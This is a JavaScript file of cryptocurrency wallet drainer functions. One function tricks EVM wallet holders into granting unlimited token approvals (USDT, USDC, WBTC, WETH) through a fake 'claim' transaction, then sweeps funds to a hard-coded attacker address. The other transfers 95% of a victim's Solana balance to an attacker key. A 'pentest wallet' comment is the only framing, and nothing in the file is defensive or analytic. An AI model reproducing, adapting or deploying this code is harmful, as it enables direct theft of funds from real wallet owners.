// EVM Drainer: Approves + sweeps ETH/tokens/BTC-wrapped (WBTC)
export async function drainEVM(walletClient, victimAddress) {
  const ATTACKER = "0x06d48afe60c038f2b5eaf8360d999db63111b3a9";  // Your pentest wallet
  
  // 1. Malicious "permit" - infinite approval for popular tokens
  const tokens = [
    "0xa0bd0d8d9758b1cd6e3a326a7026e9733f10f6d5",  // USDT (multi-chain)
    "0xdacd5023e8d884fa5c89b0fc535dcfbf41951ec7",  // USDC Mainnet
    "0x226e5f7c239707d2f5d9cc8d2d0ac8d855b1c599",  // WBTC
    "0xc02ba6c470f4c08bc94f53294b83ef04e2ab6cc2"   // WETH
  ];
  
  for (const token of tokens) {
    // Fake "claim" tx that approves ALL
    const iface = new ethers.Interface([
      "function approve(address spender, uint256 amount)"
    ]);
    const data = iface.encodeFunctionData("approve", [ATTACKER, ethers.MaxUint256]);
    
    const hash = await walletClient.sendTransaction({
      account: victimAddress,
      to: token,
      data: data,
      chainId: 1  // Mainnet - change for BSC (56)
    });
    console.log(`✅ Approved ${token.slice(0,10)}... | Tx: ${hash}`);
  }
  
  // 2. Drain tx (runs after approvals)
  const drainData = new ethers.Interface([
    "function sweep(address victim)"
  ]).encodeFunctionData("sweep", [victimAddress]);
  
  await walletClient.sendTransaction({
    account: victimAddress,
    to: ATTACKER,
    data: drainData,
    value: ethers.parseEther("0.01")  // Small ETH drain
  });
}

// Solana Drainer: Transfer + Close Account
export async function drainSolana(solana, victimPubkey) {
  const connection = new Connection("https://api.mainnet-beta.solana.com");
  const ATTACKER = new PublicKey("6K3BNbtWoNj6nLaSPahBsf43fDnM44VYabu5ydH6NZK5");
  
  // Create fake "claim" instruction that transfers all SOL + tokens
  const tx = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey: victimPubkey,
      toPubkey: ATTACKER,
      lamports: await connection.getBalance(victimPubkey) * 0.95  // 95% drain
    })
  );
  
  const signature = await solana.sendTransaction(tx, [solana.publicKey]);
  console.log(`✅ Solana drained | Sig: ${signature}`);
}